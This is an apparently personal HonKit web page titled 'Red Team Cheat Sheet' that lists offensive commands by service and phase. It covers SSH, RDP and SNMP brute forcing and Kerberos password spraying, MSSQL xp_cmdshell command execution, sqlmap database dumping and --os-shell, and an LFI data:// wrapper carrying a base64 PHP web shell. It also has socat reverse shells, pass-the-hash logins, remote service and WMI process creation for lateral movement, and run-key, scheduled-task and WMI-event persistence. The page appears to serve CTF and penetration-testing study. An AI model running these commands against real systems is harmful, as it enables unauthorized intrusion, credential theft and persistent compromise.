
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <title>Red Team Cheat Sheet ¬∑ HonKit</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="HonKit 6.1.6">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/@honkit/honkit-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/@honkit/honkit-plugin-fontsettings/website.css">
                
            
        

    

    
        
        <link rel="stylesheet" href="../styles/website.css">
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    
    <link rel="prev" href="tools.html" />
    

    </head>
    <body>
        
<div class="book honkit-cloak">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Home
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">üëã About Me</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../about/">
            
                <a href="../about/">
            
                    
                    Who Am I?
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">üß† CTF Writeups</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../writeups/">
            
                <a href="../writeups/">
            
                    
                    Overview
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2" >
            
                <span>
            
                    
                    HTB
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.2.1" >
            
                <span>
            
                    
                    üñ≥ Machines
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.2.1.1" data-path="../writeups/linux/easy/drive.html">
            
                <a href="../writeups/linux/easy/drive.html">
            
                    
                    Drive ‚Äì Linux Easy
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.1.2" data-path="../writeups/linux/easy/analytics/">
            
                <a href="../writeups/linux/easy/analytics/">
            
                    
                    Analytics - Linux Easy
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.1.3" data-path="../writeups/pwn/ret2win.html">
            
                <a href="../writeups/pwn/ret2win.html">
            
                    
                    ret2win ‚Äì ExampleCTF
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.2.2" >
            
                <span>
            
                    
                    üîê Challenges
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.2.2.1" data-path="../writeups/crypto/xor-madness.html">
            
                <a href="../writeups/crypto/xor-madness.html">
            
                    
                    XOR Madness ‚Äì CryptoCTF
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.2.3" >
            
                <span>
            
                    
                    üïµüèª Sherlocks
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.2.3.1" data-path="../writeups/web/jwt-abuse.html">
            
                <a href="../writeups/web/jwt-abuse.html">
            
                    
                    JWT Abuse ‚Äì WebCTF
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.3" >
            
                <span>
            
                    
                    THM
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.3.1" >
            
                <span>
            
                    
                    üñ≥ Machines
            
                </span>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.4" >
            
                <span>
            
                    
                    CTF's
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.4.1" >
            
                <span>
            
                    
                    Challenge Solves
            
                </span>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">üõ† Resources</li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="tools.html">
            
                <a href="tools.html">
            
                    
                    Tools I Use
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="4.1.1" data-path="redteamcheatsheet.html">
            
                <a href="redteamcheatsheet.html">
            
                    
                    Red Team Cheat Sheet
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
            Published with HonKit
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Red Team Cheat Sheet</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <p>#Protocols</p>
<p>Most common services and their ports (all TCP unless stated otherwise):</p>
<p>|                       |                              |<br></br>| --------------------- | ---------------------------- |<br></br>| **Port(s)**           | **Service**                  |<br></br>| 21                    | FTP                          |<br></br>| 22                    | SSH                          |<br></br>| 23                    | Telnet                       |<br></br>| 25                    | SMTP (mail)                  |<br></br>| 587                   | secure SMTP                  |<br></br>| 53 (UDP)              | DNS                          |<br></br>| 67 (UDP) and 68 (UDP) | DHCP                         |<br></br>| 69 (UDP)              | TFTP                         |<br></br>| 80                    | HTTP                         |<br></br>| 443                   | HTTPS                        |<br></br>| 110                   | POP3 (mail)                  |<br></br>| 111                   | ONC RPC                      |<br></br>| 143                   | IMAP (mail)                  |<br></br>| 161 (UDP)             | SNMP                         |<br></br>| 139 and 445           | SMB                          |<br></br>| 1433                  | MSSQL                        |<br></br>| 1978                  | WiFi Mouse                   |<br></br>| 2049                  | NFS                          |<br></br>| 3306                  | MySQL                        |<br></br>| 3389                  | Windows Remote Desktop (RDP) |<br></br>| 5900                  | VNC                          |<br></br>| 5985                  | WinRM HTTP                   |<br></br>| 5986                  | WinRM HTTPS                  |</p>
<p>Most common #Active-Directory  (AD) services and their ports:</p>
<p>|                   |                          |<br></br>| ----------------- | ------------------------ |<br></br>| **Port(s)**       | **Service**              |<br></br>| 53                | #DNS                     |<br></br>| 88                | #Kerberos Authentication |<br></br>| 135               | WMI RPC                  |<br></br>| 138, 139, and 445 | #SMB                     |<br></br>| 389               | #LDAP                    |<br></br>| 636               | #LDAPS                   |<br></br>| 5355              | #LLMNR                   |<br></br>| 8530 and 8531     | #WSUS                    |</p>
<p>**Indicators of Domain Controller:** ports 53, 88, 389 (LDAP), 636 (LDAPS)</p>
<p>‚óè        %SYSTEMROOT%\NTDS\NTDS.dit has all information and user password hashes</p>
<p># ARP Scan<br></br>#arp</p>
<p>arp-scan -l [range]</p>
<p>netdiscover -r [range]</p>
<p># Service Scan</p>
<p>autorecon [targets] -v</p>
<p>nmap -p‚Å†- -T4 -sC -sV -vv [targets]</p>
<p># FTP<br></br>#ftp</p>
<p>wget -m ftp://[username]:[password]@[host] ‚áí download all files</p>
<p>ftp [host] OR ftp [username]@[host]</p>
<p>Run help for a more comprehensive list of commands.</p>
<p>‚óè        ls</p>
<p>‚óè        binary ‚áí transfer binary file</p>
<p>‚óè        ascii ‚áí transfer text file</p>
<p>‚óè        put [file] ‚áí upload</p>
<p>‚óè        get [file] ‚áí download</p>
<p>‚óè        mget * ‚áí get all files</p>
<p>‚óè        close</p>
<p># SSH<br></br>#ssh #hydra #portforward</p>
<p>ssh -L [port on my machine I will use]:localhost:[port on server I want] user@ip</p>
<p>ssh [domain]\\[username]@[host] -p [port]</p>
<p>hydra -l [username] -P [wordlist] -s [port] ssh://[host]</p>
<p># SMTP</p>
<p>#nmap #smtp #sendmail #swaks</p>
<p>nmap -p25, --script smtp-open-relay [host]</p>
<p>ismtp -h [host]:25 -e [wordlist] -l 3</p>
<p>smtp-user-enum -M [mode] -U [wordlist] -t [host]</p>
<p>‚óè        modes: VRFY, EXPN, RCPT</p>
<p>‚óè        example wordlist: /usr/share/metasploit-framework/data/wordlists/unix_users.txt</p>
<p>sendemail -s [host] -xu [username] -xp [password] -f [from] -t [to] -u [subject] -m [message] -a [attachment]</p>
<p>swaks --server [host] -au [username] -ap [password] -f [from] -t [to] --h-Subject [subject] --body [message] --attach @[attachment] -n</p>
<p># SNMP<br></br>#snmp #hydra #snmpwalk</p>
<p>hydra -P [wordlist] -v [host] snmp</p>
<p>snmp-check -c [community] [ip]</p>
<p>snmpwalk -c [community] -v [version] [host] NET-SNMP-EXTEND-MIB::nsExtendOutputFull</p>
<p>snmpwalk -c [community] -v [version ‚Üí 1 or 2c] ‚áí entire MIB tree</p>
<p>snmpwalk -c [community] -v [version] [host] [identifier] ‚áí specific MIB parameter</p>
<p>MIB Identifiers</p>
<p>‚óè        System Processes:           1.3.6.1.2.1.25.1.6.0</p>
<p>‚óè        Running Programs:          1.3.6.1.2.1.25.4.2.1.2</p>
<p>‚óè        Processes Paths:               1.3.6.1.2.1.25.4.2.1.4</p>
<p>‚óè        Storage Units:    1.3.6.1.2.1.25.2.3.1.4</p>
<p>‚óè        Software Names:             1.3.6.1.2.1.25.6.3.1.2</p>
<p>‚óè        User Accounts: 1.3.6.1.4.1.77.1.2.25</p>
<p>‚óè        TCP Local Ports:                1.3.6.1.2.1.6.13.1.3</p>
<p># SMB<br></br>#nbtscan #enum4linux #cme #crackmapexec #smbmap</p>
<p>nbtscan -r [range]</p>
<p>enum4linux -v -a [host]</p>
<p>crackmapexec smb [host] -u [username] -p [password] --rid-brute</p>
<p>see [SMB Relay](#_lpa4lkravaz0)</p>
<p>**SMBMap**</p>
<p>‚óè        smbmap -H [host]</p>
<p>‚óã        -r ‚áí recursive</p>
<p>‚óã        --depth [depth] ‚áí traverse directory to specific depth (default 5)</p>
<p>‚óã        -u [username] -p [password]</p>
<p>‚óã        -x [command] ‚áí execute command</p>
<p>‚óã        -s [share] ‚áí enumerate share</p>
<p>‚óã        -d [domain] ‚áí enumerate domain</p>
<p>‚óã        --download [file]</p>
<p>‚óã        --upload [file]</p>
<p>OR</p>
<p>**SMBClient** #smbclient</p>
<p>smbclient -N -L //[host]</p>
<p>‚óè        smbclient //[host]/[share]</p>
<p>‚óã        -L [host] ‚áí list shares</p>
<p>‚óã        -I [ip]</p>
<p>‚óã        -D [directory]</p>
<p>‚óã        -U [domain]/[username]%[password]</p>
<p>‚óã        -N ‚áí don‚Äôt use password</p>
<p>‚óã        -c [command]</p>
<p>‚óè        download interesting files with</p>
<p>‚óã        smbclient //[host]/[share] (optional: -U [username])</p>
<p>‚óã        get [filename]</p>
<p>‚óã        put [filename]</p>
<p>‚óã        exit</p>
<pre><code>            OR recursively download all with
</code></pre><p>‚óã        prompt off</p>
<p>‚óã        recurse on</p>
<p>‚óã        mget *</p>
<p>OR</p>
<p>**SMBGet** #smbget</p>
<p>‚óè        smbget -R smb://[host]/[disk] ‚áí download all files</p>
<p>**Bruteforce:** crackmapexec smb [host] -u [user/users/file] -p [password/passwords/file] --continue-on-success</p>
<p>‚óè        [-] ‚áí invalid credentials</p>
<p>‚óè        [+] ‚áí valid credentials</p>
<p>‚óè        (Pwn3d!) ‚áí user is local admin</p>
<p>## Windows<br></br>#windows #shares</p>
<p>Shares</p>
<p>‚óè        SYSVOL ‚áí AD stuff (GPOs, logon scripts) C:\Windows\SYSVOL on DC</p>
<p>‚óè        C ‚áí C:\</p>
<p>‚óè        IPC ‚áí enumeration (admin scripts, event logs, etc)</p>
<p>dir \\[domain or ip]\[share] /user:[username] [password]</p>
<p>**Note:** domain ‚áí kerberos auth vs ip ‚áí NTLM auth</p>
<p>net use [drive letter]: \\[domain]\[share] /user:[username] [password] /persistent:yes</p>
<p># LDAP<br></br>#ldap #ldapsearch</p>
<p>nmap --script=ldap* [host]</p>
<p>ldapdomaindump ldap://[host] -u '[domain]\[user]' -p [password] -o [dir]</p>
<p>ldapsearch -x -H ldap://[host] -b base namingcontexts</p>
<p>ldapsearch -x -H ldap://[host] -D '[domain]\[user]' -w [password] -b "DC=[subdomain],DC=[TLD]"</p>
<p># Kerberos<br></br>#kerberos #kerbrute</p>
<p>kerbrute userenum --dc [DC] -d [domain] [userlist]</p>
<p>kerbrute passwordspray --dc [DC] -d [domain] [userlist] [password]</p>
<p>kerbrute bruteuser --dc [DC] -d [domain] [passlist] [user]</p>
<p>kerbrute bruteforce --dc [DC] -d [domain] [credslist]</p>
<p>‚óè        credslist contains [user]:[pass] on each line</p>
<p># RPC<br></br>#rpcclient #rpc</p>
<p>[Useful RPC commands](<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration" target="_blank">https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration</a>)</p>
<p>rpcclient -N -U "" [host]</p>
<p>rpcclient -U [domain]/[user]%[password] [host]</p>
<p>‚óè        -N ‚áí no password</p>
<p>‚óè        --pw-nt-hash ‚áí supplied password is an nt hash</p>
<p># SQL<br></br>#sql #mysql #impacket</p>
<p>**MySQL:** mysql -h [host] -P [port] -u [username] -p'[password]'</p>
<p>**PostgreSQL:** PGPASSWORD=[password] psql -h [host] -p [port] -U [username]</p>
<p>**MSSQL**</p>
<p>impacket-mssqlclient [domain]/[username]:[password]@[host] -port [port] -windows-auth</p>
<p>### Interesting Functions</p>
<p>use master;</p>
<p>EXEC sp_helprotect 'xp_cmdshell';</p>
<p>EXEC sp_helprotect 'xp_regread';</p>
<p>EXEC sp_helprotect 'xp_regwrite';</p>
<p>EXEC sp_helprotect 'xp_dirtree';</p>
<p>EXEC sp_helprotect 'xp_subdirs';</p>
<p>EXEC sp_helprotect 'xp_fileexist';</p>
<p>### Command Execution</p>
<p>SELECT value FROM sys.configurations WHERE name \= 'xp_cmdshell';</p>
<p>EXEC sp_configure 'show advanced options', '1';</p>
<p>RECONFIGURE WITH OVERRIDE;</p>
<p>EXEC sp_configure 'xp_cmdshell', 1;</p>
<p>RECONFIGURE;</p>
<p>EXEC xp_cmdshell [command];</p>
<p>### Impersonate</p>
<p>SELECT * FROM sys.server_permissions WHERE permission_name \= 'IMPERSONATE';<br></br>SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;<br></br>EXECUTE AS login \= '[user]'; [query];</p>
<p>EXECUTE AS login \= '[user]'; EXEC xp_cmdshell '[command]';</p>
<p>### Over Link</p>
<p>SELECT srvname, srvproduct, rpcout FROM master..sysservers;</p>
<p>SELECT * FROM OPENQUERY("[target (srvname)]", '[query]');</p>
<p>SELECT * FROM OPENQUERY("[target]", 'SELECT @@SERVERNAME; exec xp_cmdshell ''[command]''');</p>
<p>**Note:** When using xp_cmdshell with OpenQuery, prepend a dummy query before it or else it won‚Äôt work.</p>
<p># NFS</p>
<p>rpcinfo -p [host]</p>
<p>showmount -e [host]</p>
<p>mount [host]:[share] /mnt/[dir]</p>
<p>unmount /mnt/[dir]</p>
<p># WinRM</p>
<p>crackmapexec winrm [hosts] -u [username] -p [password]</p>
<p>evil-winrm -i [host] -u [user] -p [password]</p>
<p>evil-winrm -i [host] -u [user] -H [hash]</p>
<p>KRB5CCNAME=[ticket].ccache</p>
<p>evil-winrm -i [host] -r [domain] -u [user]</p>
<p># RDP</p>
<p>xfreerdp /u:[domain]\\[username] /p:[password] /v:[host] +clipboard /drive:[Windows share name],[kali folder]</p>
<p>xfreerdp /u:[domain]\\[username] /pth:[hash] /v:[host] +clipboard /drive:[Windows share name],[kali folder]</p>
<p>rdesktop -d [domain] -u [username] -p [password] [host]</p>
<p>hydra -l [username] -P [wordlist] -s [port] rdp://[host]</p>
<p># VNC</p>
<p>vncviewer [host]:[port] -passwd [password file]</p>
<p>hydra -s [port] -P [wordlist] -t 4 [host] vnc</p>
<p>Web Pen Testing</p>
<p>**Payloads:** [PayloadsAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings</a>)</p>
<p>**Encoding/Decoding:** [C](<a href="https://gchq.github.io/CyberChef/)\[yberChef\](https://gchq.github.io/CyberChef/" target="_blank">https://gchq.github.io/CyberChef/)\[yberChef\](https://gchq.github.io/CyberChef/</a>)</p>
<p># Site Recon</p>
<p>[NetCraft](<a href="https://sitereport.netcraft.com/" target="_blank">https://sitereport.netcraft.com/</a>)</p>
<p>[Shodan](<a href="https://www.shodan.io" target="_blank">https://www.shodan.io</a>)</p>
<p>[Censys](<a href="https://search.censys.io" target="_blank">https://search.censys.io</a>)</p>
<p>[Wappalyzer](<a href="https://www.wappalyzer.com" target="_blank">https://www.wappalyzer.com</a>)</p>
<p>[BuiltWith](<a href="https://builtwith.com" target="_blank">https://builtwith.com</a>)</p>
<p># Subdomains</p>
<p>theharvester -d [domain] -b [search engine]</p>
<p>amass enum -passive -src -d [domain]</p>
<p>amass enum -active -d [domain]</p>
<p>cat [file with domains] | httprobe</p>
<p># GoBuster</p>
<p>gobuster dns -d [domain] -w [wordlist] -t [num threads]</p>
<p>gobuster dir -u [target URL] -x [file extensions] -w [wordlist]</p>
<p>gobuster dir -u [target URL] -x [file extensions] -w [wordlist] -U [auth username] -P [auth password] -s [invalid status codes] -t [num threads]</p>
<p>‚óè        -k ‚áí don‚Äôt check ssl cert</p>
<p># ffuf</p>
<p>**Directories:**        ffuf -w [wordlist] -u <a href="http://\[URL\]/FUZZ" target="_blank">http://\[URL\]/FUZZ</a></p>
<p>**Files:**                     ffuf -w [wordlist] -u <a href="http://\[URL\]/FUZZ" target="_blank">http://\[URL\]/FUZZ</a> -e .aspx,.html,.php,.txt,.pdf -recursion</p>
<p>**Subdomains:**     ffuf -w [wordlist] -u <a href="http://\[URL\" target="_blank">http://\[URL\</a>] -H "Host: FUZZ.[domain]"</p>
<p>**POST Data:**          ffuf -w [wordlist] -X POST -d "[username=admin\\&amp;password=FUZZ]" -u <a href="http://\[URL\" target="_blank">http://\[URL\</a>]</p>
<p>**From File:**           ffuf -request [req.txt] -request-proto http -w [wordlist]</p>
<p>**Creds:**                   ffuf -request [req.txt] -request-proto http -mode [pitchfork/clusterbomb] -w [usernames.txt]:[HFUZZ] -w [passwords.txt]:[WFUZZ]</p>
<p>**‚ÄúGood‚Äù (Match)**</p>
<p>‚óè        -mc ‚áí status code</p>
<p>‚óè        -ms ‚áí response size</p>
<p>‚óè        -mw ‚áí number of words</p>
<p>‚óè        -ml ‚áí number of lines</p>
<p>‚óè        -mr ‚áí regex pattern</p>
<p>**‚ÄúBad‚Äù (Filter)**</p>
<p>‚óè        -fc ‚áí status code</p>
<p>‚óè        -fs ‚áí response size</p>
<p>‚óè        -fw ‚áí number of words</p>
<p>‚óè        -fl ‚áí number of lines</p>
<p>‚óè        -fr ‚áí regex pattern</p>
<p># BurpSuite</p>
<p>### BurpSuite Tabs</p>
<p>‚óè        **Target** ‚áí site map and spidering</p>
<p>‚óè        **Proxy** ‚áí intercept traffic</p>
<p>‚óè        **Intruder** ‚áí bruteforce attacks (think automated repeater)</p>
<p>‚óè        **Repeater** ‚áí send same request multiple times with different parameters</p>
<p>‚óè        **Sequencer** ‚áí analyse quality of randomness in session tokens</p>
<p>‚óè        **Decoder** ‚áí encode/decode text as hex, UTF, etc.</p>
<p>‚óè        **Extender** ‚áí add plugins</p>
<p>### Intruder Attack Types</p>
<p>Single Payload Set</p>
<p>‚óè        **Sniper:** each payload goes to each payload position, in turn</p>
<p>‚óè        **Battering Ram:** same payload in all positions</p>
<p>Multiple Payload Sets</p>
<p>‚óè        **Pitchfork:** same payload position from multiple sets at a time (credential stuffing)</p>
<p>‚óè        **Cluster Bomb:** all payload combinations</p>
<p>### Scoping Target</p>
<p>‚óè        right-click ‚Üí Add to scope</p>
<p>‚óè        click filter bar on top ‚Üí under Filter by request type, check Show only in-scope items</p>
<p># SQLmap</p>
<p>‚óè        sqlmap -u [base URL] --crawl=1 (check all pages for injectability)</p>
<p>‚óè        sqlmap -u [website URL] --current-user (gets current user)</p>
<p>‚óè        sqlmap -u [website URL] --dbs (gets databases)</p>
<p>‚óè        sqlmap -u [website URL] --current-database (gets current database)</p>
<p>‚óè        sqlmap -u [website URL] --dump --threads=[number] (gets all data from database)</p>
<p>‚óè        sqlmap -u [website URL] -D [database] --tables (gets tables)</p>
<p>‚óè        sqlmap -u [website URL] -D [database] -T [table] --columns (gets columns)</p>
<p>‚óè        sqlmap -u [website URL] -D [database] -T [table] -C [columns ‚Üí can be multiple separated by ,] --dump</p>
<p>‚óè        sqlmap -u [website URL] --os-shell (attempts to get shell on target)</p>
<p># Local File Inclusion (LFI)</p>
<p>### Directories to try</p>
<p>/etc/passwd</p>
<p>/var/log/apache2/access.log</p>
<p>C:\Windows\System32\drivers\etc\hosts</p>
<p>### PHP wrappers</p>
<p>php://filter/resource=[file].php ‚áí display contents of PHP file</p>
<p>php://filter/convert.base64-encode/resource=[file].php</p>
<p>data://text/plain,\&lt;?php[code]?&gt; ‚áí run PHP code</p>
<p>data://text/plain;base64,[base64] ‚áí run base 64 encoded PHP code</p>
<p>data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==\&amp;cmd=ls</p>
<p># WordPress</p>
<p>wpscan --url <a href="http://\[host\" target="_blank">http://\[host\</a>] -e vp,vt --detection-mode aggressive -v --api-token [token]</p>
<p>get token from [<a href="https://wpscan.com/profile\](https://wpscan.com/profile" target="_blank">https://wpscan.com/profile\](https://wpscan.com/profile</a>)</p>
<p># Git</p>
<p>git-dumper <a href="http://\[url\" target="_blank">http://\[url\</a>] [output dir]</p>
<p>git status</p>
<p>git log</p>
<p>git show [commit hash]</p>
<p>git reset --hard [commit hash]</p>
<p>Linux/Kali</p>
<p>I will think of a better title for this section, I swear.</p>
<p>[Linux Terminal Cheat Sheet](<a href="https://docs.google.com/document/d/1vJxoHrjW607NJDLC1Zln1llrEIqrS6Ea3j9ihJTdblg/" target="_blank">https://docs.google.com/document/d/1vJxoHrjW607NJDLC1Zln1llrEIqrS6Ea3j9ihJTdblg/</a>)</p>
<p>[Linux Printing Tricks](<a href="https://github.com/RedefiningReality/Linux-Defence-Materials/blob/main/Linux%20Terminal/Printing%20Tricks.md" target="_blank">https://github.com/RedefiningReality/Linux-Defence-Materials/blob/main/Linux%20Terminal/Printing%20Tricks.md</a>)</p>
<p>[Reverse Shells](<a href="https://www.revshells.com" target="_blank">https://www.revshells.com</a>)</p>
<p>socat file:`tty`,raw,echo=0 tcp-listen:[port]</p>
<p>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[ip]:[port]</p>
<p>socat.exe exec:'cmd.exe',pipes TCP4:[ip]:[port]</p>
<p># Serving Files</p>
<p>**HTTP:** python3 -m http.server [port] --directory [directory]</p>
<p>**SMB:** impacket-smbserver [share] [directory] -port [port] -username [username] -password [password] -smb2support</p>
<p>**FTP:** python3 -m pyftpdlib -d [directory] -p [port] -u [username] -P [password]</p>
<p>‚óè        add -w for write permission</p>
<p># Beautify Shell</p>
<p>‚óè        python -c 'import pty; pty.spawn("/bin/bash")' OR script -qc /bin/bash /dev/null OR perl -e 'exec "/bin/sh";'</p>
<p>‚óè        ^Z (Ctrl+Z)</p>
<p>‚óè        stty -a</p>
<p>‚óã        remember rows and columns</p>
<p>‚óè        stty raw -echo</p>
<p>‚óè        fg</p>
<p>‚óè        fg (yes, you have to type it twice ‚Üí this is not a typo)</p>
<p>‚óè        export term=xterm</p>
<p>‚óè        stty rows [rows] columns [columns]</p>
<p># Persistence</p>
<p>### Create New Service</p>
<p>edit /etc/systemd/system/[service].service</p>
<table>
<thead>
<tr>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>[Unit]\<br\>\<br\>Description=[description]\<br\>\<br\>[Service]\<br\>\<br\>Type=simple\<br\>\<br\>Restart=always\<br\>\<br\>ExecStart=[executable]\<br\>\<br\>[Install]\<br\>\<br\>WantedBy=multi-user.target</br\></br\></br\></br\></br\></br\></br\></br\></br\></br\></br\></br\></br\></br\></td>
</tr>
</tbody>
</table>
<p>systemctl daemon reload</p>
<p>systemctl enable [service]</p>
<p>### Create New Cron Job</p>
<p>crontab -e</p>
<p>[minute] [hour] [day of month] [month] [day of week] [command]</p>
<p>Windows</p>
<p>[Windows Terminal Cheat Sheet](<a href="https://docs.google.com/document/d/1CGgADAOZQuMXAyzXVeXRNhQ\_PPBYliMXCy-4RNE0UMw/" target="_blank">https://docs.google.com/document/d/1CGgADAOZQuMXAyzXVeXRNhQ\_PPBYliMXCy-4RNE0UMw/</a>)</p>
<p>[PowerView Cheat Sheet](<a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" target="_blank">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</a>)</p>
<p># Lateral Movement</p>
<p>## Remote Enumeration</p>
<p>net session \\[host]</p>
<p>reg query \\[host]\[key] ...</p>
<p>net view \\[host]</p>
<p>dir \\[host]\[share]</p>
<p>net use * \\[host]\[share] /user:[domain]\[username] [password]</p>
<p>tasklist /s [host] ...</p>
<p>## Movement</p>
<p>psexec \\[host] -u [username] -p [password] -i cmd</p>
<p>winrs -u:[username] -p:[password] -r:[host] cmd</p>
<p>### Switch Users</p>
<p>runas /user:[domain]\[username] cmd</p>
<p>‚óè        /netonly to keep same user access on local machine (only login for network connections)</p>
<p>‚óè        /savecred to get creds from or save creds to Windows Credential Manager</p>
<p>runascs [username] [password] cmd</p>
<p>‚óè        -d [domain]</p>
<p>‚óè        -r [host]:[port] ‚áí reverse shell</p>
<p>‚óè        -b ‚áí bypass UAC</p>
<p>### Create New Process (WMI)</p>
<p>wmic /node:[ip] process call create [executable]</p>
<p>Invoke-CimMethod -ClassName Win32_Process -MethodName Create -CimSession (New-CimSession -ComputerName "[ip]") -Arguments @{CommandLine="[executable]"}</p>
<p>### Create New Service</p>
<p>sc \\[host] create [service] binPath= "[executable]" start= auto displayname= "[name]"</p>
<p>sc \\[host] description [service] "[description]"</p>
<p>sc \\[host] [start/stop/delete] [service]</p>
<p>### Modify Existing Service</p>
<p>sc \\[host] qc vss ‚Üí ‚úì service runs as LocalSystem</p>
<p>sc \\[host] query vss ‚Üí ‚úì service is currently not running</p>
<p>sc \\[host] config vss binpath= "[executable]"</p>
<p>sc \\[host] [start/stop] vss</p>
<p>### Create Scheduled Task</p>
<p>schtasks /s [host] /ru [user] /create /f /tn [name] /tr [command] /sc ONCE /sd 01/01/1970 /st 00:00</p>
<p>schtasks /s [host] /run /tn [name]</p>
<p># Persistence</p>
<p>## User Level</p>
<p>**Note:** To find more autorun options, check out [Autoruns from SysInternals](<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns" target="_blank">https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns</a>). This includes startup directories and registry keys.</p>
<p>### Startup Directories</p>
<p>‚óè        %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup ‚áí executed when current user logs in</p>
<p>‚óè        %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup ‚áí executed when any user logs in</p>
<p>### Registry Run Key</p>
<p>**Runs When Current User Logs In**</p>
<p>upload exe file to somewhere in %USERPROFILE%\AppData\Roaming</p>
<p>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v [name] /t REG_SZ /f /d "[path to exe]"</p>
<p>**Runs When Any User Logs In**</p>
<p>upload exe file to somewhere in C:\ProgramData</p>
<p>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v [name] /t REG_SZ /f /d "[path to exe]"</p>
<p>### Scheduled Task</p>
<p>upload exe file to somewhere in %USERPROFILE%\AppData\Roaming</p>
<p>schtasks /create /f /tn [name] /tr [path to exe] /sc ONLOGON</p>
<p>schtasks /create /f /tn [name] /tr [path to exe] /sc DAILY /st [hh:mm]</p>
<p>‚óè        check with schtasks /query /tn [name] /fo list /v</p>
<p>‚óè        run manually with schtasks /run /tn [name]</p>
<p>## System Level</p>
<p>[DLL Hijacking](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a>)</p>
<p>### Startup Service</p>
<p>upload file to somewhere in %SystemRoot%\System32</p>
<p>**Note:** either upload a _service_ executable or use cmd /c start /b [executable] as your binpath</p>
<p>sc create [service] binPath= "[executable]" start= auto displayname= "[name]"</p>
<p>sc description [service] "[description]"</p>
<p>sc [start/stop/delete] [service]</p>
<p>### Scheduled Task</p>
<p>upload exe file to somewhere in %SystemRoot%\System32</p>
<p>schtasks /create /f /tn [name] /ru system /tr [path to exe] /sc ONSTART</p>
<p>schtasks /create /f /tn [name] /ru system /tr [path to exe] /sc DAILY /st [hh:mm]</p>
<p>‚óè        check with schtasks /query /tn [name] /fo list /v</p>
<p>‚óè        run manually with schtasks /run /tn [name]</p>
<p>### WMI Event</p>
<p>upload exe file to somewhere in %SystemRoot%\System32</p>
<p>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="[name]", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</p>
